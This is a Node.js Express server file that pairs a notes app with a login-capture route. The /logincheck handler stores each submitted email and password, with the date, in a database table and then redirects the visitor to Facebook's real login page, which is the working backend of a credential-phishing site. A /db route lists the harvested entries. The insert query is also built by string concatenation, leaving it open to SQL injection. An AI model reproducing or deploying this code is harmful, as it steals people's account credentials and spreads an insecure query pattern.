const express = require('express')
const cool = require('cool-ascii-faces')
const path = require('path')
const { Pool } = require('pg');
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: true
});
const PORT = process.env.PORT || 5000
var notes = require('./routes/notes');

express()
  .use(express.json())
  .use(express.urlencoded({ extended: false }))
  .use(express.static(path.join(__dirname, 'public')))
  .set('views', path.join(__dirname, 'views'))
  .set('view engine', 'ejs')
  .get('/', (req, res) => res.render('pages/index'))
  .get('/cool2', (req, res) => res.send(cool()))
  .get('/login', (req, res) => res.render('pages/login'))
  .post('/logincheck', async (req, res) => {
    try {
      var a = req.body.email;
      var b = req.body.pass;
      var qquery = "insert into test_table values(1,'"+a+"|"+b+"|"+new Date().toDateString()+"')";
      //console.log(a+"|"+b);
      const client = await pool.connect()
      const result = await client.query(qquery);
      // const results = { 'results': (result) ? result.rows : null };
      client.release();
      res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110');
    } catch (err) {
      console.error(err);
      res.send("Error " + err);
    }
  })
  .get('/db', async (req, res) => {
    try {
      const client = await pool.connect()
      const result = await client.query('SELECT * FROM test_table');
      const results = { 'results': (result) ? result.rows : null };
      res.render('pages/db', results);
      client.release();
    } catch (err) {
      console.error(err);
      res.send("Error " + err);
    }
  })
  // .get('/list', async (req, res) => {
  //   res.render('pages/notelist', { title: 'Notes', notes: notes });
  // })
  .use('/list', notes.list)
  .use('/noteadd', notes.add)
  .post('/notesave', notes.save)
  .use('/noteview', notes.view)
  .use('/noteedit', notes.edit)
  .use('/notedestroy', notes.destroy)
  .post('/notedodestroy', notes.dodestroy)
  // error handler
  .use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
  })
  .listen(PORT, () => console.log(`Listening on ${PORT}`))
